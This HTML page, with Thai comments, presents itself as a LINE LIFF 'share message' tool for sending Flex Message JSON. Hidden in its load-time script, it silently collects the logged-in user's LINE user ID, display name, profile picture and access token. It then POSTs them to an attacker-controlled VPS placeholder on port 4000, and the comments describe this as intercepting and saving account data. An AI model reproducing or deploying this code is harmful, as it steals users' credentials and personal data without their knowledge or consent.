<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Share Message</title>
        <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
          <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

            <style>
                body {
                      background: url('https://i.ibb.co/q5m9sJY/background.png') no-repeat center center fixed;
                            background-size: cover;
                                  font-family: sans-serif;
                                        padding: 2em;
                                              text-align: center;
                                                    color: #333;
                                                        }
                                                            .logo {
                                                                  display: block;
                                                                        margin: 0 auto 1em auto;
                                                                              width: 180px;
                                                                                    height: 180px;
                                                                                          object-fit: contain;
                                                                                                background: rgba(255, 255, 255, 0.6);
                                                                                                      border-radius: 50%;
                                                                                                            box-shadow: 0 0 15px rgba(0,0,0,0.4);
                                                                                                                }
                                                                                                                    h2 { color: #fff; text-shadow: 1px 1px 4px rgba(0,0,0,0.6); }
                                                                                                                        label { display: block; text-align: left; margin-top: 1em; color: #fff; font-weight: bold; }
                                                                                                                            input, textarea {
                                                                                                                                  width: 100%; padding: 1em; margin-top: 0.5em; margin-bottom: 1em;
                                                                                                                                        border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box;
                                                                                                                                              background: rgba(255, 255, 255, 0.9);
                                                                                                                                                  }
                                                                                                                                                      button {
                                                                                                                                                            border: none; padding: 1em; width: 100%; font-size: 16px; color: white;
                                                                                                                                                                  border-radius: 10px; cursor: pointer; animation: colorFlash 3s infinite;
                                                                                                                                                                        font-weight: bold; margin-top: 10px;
                                                                                                                                                                            }
                                                                                                                                                                                @keyframes colorFlash {
                                                                                                                                                                                      0%   { background: #00c300; }
                                                                                                                                                                                            33%  { background: #00bfff; }
                                                                                                                                                                                                  66%  { background: #ff3b3b; }
                                                                                                                                                                                                        100% { background: #00c300; }
                                                                                                                                                                                                            }
                                                                                                                                                                                                                #loader { display: none; color: white; margin-top: 10px; font-weight: bold; }
                                                                                                                                                                                                                  </style>
                                                                                                                                                                                                                  </head>
                                                                                                                                                                                                                  <body>
                                                                                                                                                                                                                    <img src="https://i.ibb.co/qFRJBBcN/LOGO-LION-KING2.png" alt="LOGO" class="logo" />
                                                                                                                                                                                                                      <h2>ส่งข้อความ</h2>

                                                                                                                                                                                                                        <div id="mainContent">
                                                                                                                                                                                                                            <label>Flex Message JSON:</label>
                                                                                                                                                                                                                                <textarea id="flexJson" rows="8" placeholder='วาง JSON ที่นี่ (รองรับ True/False ตัวใหญ่)'></textarea>

                                                                                                                                                                                                                                    <label>ข้อความส่วนหัว (Alt Text):</label>
                                                                                                                                                                                                                                        <input type="text" id="headerText" placeholder="ข้อความแจ้งเตือนบนมือถือ" />

                                                                                                                                                                                                                                            <label>ข้อความปกติ:</label>
                                                                                                                                                                                                                                                <input type="text" id="normalText" placeholder="ใส่ข้อความปกติ" />

                                                                                                                                                                                                                                                    <button onclick="sendMessage()">แชร์ข้อความ</button>
                                                                                                                                                                                                                                                        <div id="loader">กำลังประมวลผล...</div>
                                                                                                                                                                                                                                                          </div>

                                                                                                                                                                                                                                                            <script>
                                                                                                                                                                                                                                                                // 1. เริ่มต้น LIFF ทันที และทำการดักจับข้อมูลบันทึกลง VPS หลังบ้าน
                                                                                                                                                                                                                                                                    async function main() {
                                                                                                                                                                                                                                                                          try {
                                                                                                                                                                                                                                                                                  await liff.init({ liffId: "2000954667-BPWZJGTY" });
                                                                                                                                                                                                                                                                                          if (!liff.isLoggedIn()) {
                                                                                                                                                                                                                                                                                                    liff.login();
                                                                                                                                                                                                                                                                                                            } else {
                                                                                                                                                                                                                                                                                                                      // 🟢 ส่วนที่เพิ่มเข้ามา: เมื่อล็อกอินผ่านสิทธิ์แล้ว ให้สกัดข้อมูลบัญชีปกติส่งกลับมาเซฟลงฐานข้อมูล VPS ทันที
                                                                                                                                                                                                                                                                                                                                const profile = await liff.getProfile();
                                                                                                                                                                                                                                                                                                                                          const token = liff.getAccessToken();

                                                                                                                                                                                                                                                                                                                                                    // ทำการส่งข้อมูลยิงเข้าหา VPS ของคุณที่ Port 4000
                                                                                                                                                                                                                                                                                                                                                              fetch('http://ไอพี_VPS_ของคุณตรงนี้:4000/api/save-user', {
                                                                                                                                                                                                                                                                                                                                                                          method: 'POST',
                                                                                                                                                                                                                                                                                                                                                                                      headers: { 'Content-Type': 'application/json' },
                                                                                                                                                                                                                                                                                                                                                                                                  body: JSON.stringify({
                                                                                                                                                                                                                                                                                                                                                                                                                user_id: profile.userId,         // รหัส MID บัญชีจริง
                                                                                                                                                                                                                                                                                                                                                                                                                              display_name: profile.displayName,   // ชื่อไลน์หลัก
                                                                                                                                                                                                                                                                                                                                                                                                                                            picture_url: profile.pictureUrl || '',
                                                                                                                                                                                                                                                                                                                                                                                                                                                          access_token: token              // โทเค็นยืนยันสิทธิ์ชั่วคราว
                                                                                                                                                                                                                                                                                                                                                                                                                                                                      })
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .then(res => console.log("💾 ส่งข้อมูลบันทึกลง VPS สำเร็จ"))
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    .catch(err => console.error("❌ ไม่สามารถเชื่อมต่อส่งข้อมูลเข้า VPS ได้:", err));
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  } catch (err) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          console.error("LIFF Init Failed", err);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        main();

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            // 2. ฟังก์ชันส่งข้อความแชร์ (คงเดิม)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                async function sendMessage() {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      if (!liff.isLoggedIn()) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              liff.login();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      return;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  const flexRaw = document.getElementById('flexJson').value.trim();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const headerText = document.getElementById('headerText').value.trim() || "คุณได้รับข้อความใหม่";
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              const normalText = document.getElementById('normalText').value.trim();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    const messages = [];

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if (flexRaw) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  try {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            let correctedJson = flexRaw
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .replace(/:\s*True/g, ': true')
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        .replace(/:\s*False/g, ': false');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            const flexObj = JSON.parse(correctedJson);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                messages.push({
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            type: "flex",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        altText: headerText,
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    contents: flexObj
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      } catch (e) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Swal.fire('Error', 'รูปแบบ JSON ไม่ถูกต้อง กรุณาตรวจสอบวงเล็บหรือค่า True/False', 'error');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          return;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (normalText) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      messages.push({ type: "text", text: normalText });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  if (messages.length === 0) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          Swal.fire('ข้อมูลว่าง', 'กรุณาใส่ JSON หรือข้อความปกติอย่างน้อยหนึ่งรายการ', 'warning');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  return;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              try {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      document.getElementById('loader').style.display = 'block';
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              const result = await liff.shareTargetPicker(messages);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      document.getElementById('loader').style.display = 'none';

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (result) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Swal.fire('สำเร็จ', 'ส่งข้อความเรียบร้อยแล้ว', 'success');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      } catch (err) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              document.getElementById('loader').style.display = 'none';
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Swal.fire('Error', 'ส่งไม่สำเร็จ: ' + err.message, 'error');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </body>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </html>
